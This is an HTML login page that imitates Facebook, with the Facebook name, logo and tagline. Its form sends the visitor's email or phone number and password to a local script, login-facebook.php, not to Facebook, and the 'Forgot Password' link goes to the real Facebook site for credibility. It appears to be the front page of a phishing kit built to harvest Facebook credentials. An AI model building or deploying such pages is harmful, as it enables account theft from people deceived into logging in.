<html lang="en">
  <head>
  <link rel="icon" href="https://logodownload.org/wp-content/uploads/2014/09/facebook-logo-3-1.png">
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - Login or Register</title>
    <link rel="stylesheet" href="../css/style-facebook.css" />
  </head>
  <body>
    <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">facebook</h1>
          <p>Connect with friends and the world around you on Facebook.</p>
        </div>
          <form action="login-facebook.php" method="POST">
            <input type="text" name="correo" placeholder="Email or Phone Number" required />
            <input type="password" name="password" placeholder="Password" required>
            <button class="login">Log In</button>
            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgot Password ?</a>
            <hr>
            <button class="create-account">Create New Account</button>
          </form>
      </div>
      <br>
      <div id="famous">
      <a><b>Crea una página</b> para un famoso, una marca o una empresa.</a>
      </div>
    </div>
  </body>
</html>
